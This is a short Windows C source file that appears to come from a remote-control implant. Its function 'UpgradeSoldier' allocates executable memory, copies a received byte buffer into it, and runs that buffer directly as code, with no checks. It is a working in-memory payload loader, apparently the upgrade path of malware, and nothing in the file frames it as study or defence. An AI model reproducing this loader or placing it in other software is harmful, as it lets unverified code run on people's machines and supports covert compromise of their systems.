#include <Windows.h>
#include "main.h"
#include "globals.h"
#include "loader.h"
#include "utils.h"
#include "upgrade.h"

ULONG UpgradeSoldier(__in LPWSTR strUpgradeName, __in LPBYTE lpFileBuff, __in DWORD dwFileSize)
{
	BOOL bRet = FALSE; 
	PVOID pExecMemory;
	
	pExecMemory = VirtualAlloc(NULL, dwFileSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(pExecMemory, lpFileBuff, dwFileSize);

	bRet = (*(BOOL (*)()) pExecMemory)();

	VirtualFree(pExecMemory, 0, MEM_RELEASE);

	return bRet;
}
